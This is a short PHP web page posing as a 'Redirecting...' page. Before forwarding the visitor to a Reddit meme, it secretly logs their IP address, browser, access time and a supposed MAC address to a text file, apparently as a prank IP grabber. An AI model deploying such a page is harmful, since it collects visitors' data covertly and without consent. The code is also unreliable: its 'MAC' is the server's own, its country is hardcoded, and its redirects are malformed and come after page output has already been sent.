<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
</head>

<body>
    <?php
        $f = fopen("data.txt","a");
        if($f == NULL){
            header("Location: www.reddit.com/r/memes/comments/v70ine/plot_twist/");
            exit();
        }

        //Header

        fwrite($f," --- CONNECTION ATTEMPT ---\n");

        //Time

        fwrite($f,"Time ( Epoch ) : ".time()."\n");
        $today = getdate();
        fwrite($f,"Time ( DD/MM/YYYY ) : ".$today["mday"]."/".$today["mon"]."/".$today["year"]."\n");

        //IP

        fwrite($f,"IP : ".$_SERVER['REMOTE_ADDR']."\n");
        //echo "IP : ".$_SERVER['REMOTE_ADDR']."\n";

        //DNS

        $mac_raw = exec('getmac');
        fwrite($f,"MAC : ".substr($mac_raw, 0, 17)."\n");
        //echo "MAC : ".substr($mac_raw, 0, 17)."\n";

        //Browser

        $bwdata = get_browser(null,true);
        fwrite($f,"Browser : ".$bwdata["browser"]." ".$bwdata["version"]."\n");
        fwrite($f,"Browser ( Raw data ) : ".$bwdata["browser_name_pattern"]."\n");

        //Server protocol

        fwrite($f,"Server protocol : ".$_SERVER['SERVER_PROTOCOL']."\n");

        //Localisation

        fwrite($f,"Country : Australia\n");
    ?>

    <p>Redirecting...</p>

    <?php
        fwrite($f," --- DATA END ---\n\n");
        fclose($f);
        header("Location: www.reddit.com/r/memes/comments/v70ine/plot_twist/");
        exit();
    ?>
</body>

</html>